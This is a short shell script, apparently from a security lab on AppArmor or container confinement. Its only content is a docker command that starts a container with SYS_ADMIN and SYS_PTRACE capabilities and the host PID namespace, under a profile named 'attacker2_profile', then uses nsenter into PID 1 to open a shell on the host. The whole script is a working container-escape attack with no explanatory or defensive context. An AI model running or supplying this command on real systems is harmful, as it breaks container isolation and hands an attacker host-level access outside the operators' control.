#!/bin/sh

docker run --rm -it --security-opt "apparmor=attacker2_profile" --cap-add SYS_ADMIN --cap-add SYS_PTRACE --pid=host debian:latest nsenter -t 1 -m sh

